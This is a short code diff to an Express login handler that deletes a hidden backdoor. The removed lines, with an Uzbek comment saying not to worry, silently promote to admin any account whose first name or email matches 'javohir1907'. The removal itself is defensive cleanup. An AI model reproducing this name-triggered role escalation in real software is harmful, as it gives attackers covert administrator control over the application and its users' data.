@@ -101,17 +101,6 @@ export function setupAuth(app: Express) {
         return res.status(401).json({ message: "Invalid email or password" });
       }
 
-      // Xavotir olmang! Tizimga kirish avtida javohir1907 ni avtomat admin qiladi!
-      if (
-        (user.firstName && user.firstName.toLowerCase() === "javohir1907") ||
-        user.email.toLowerCase().includes("javohir1907")
-      ) {
-        if ((user as any).role !== "admin") {
-          await db.update(users).set({ role: "admin" } as any).where(eq(users.id, user.id));
-          (user as any).role = "admin";
-        }
-      }
-
       (req.session as any).userId = user.id;
       const { password: _, ...safeUser } = user;
       res.json(safeUser);
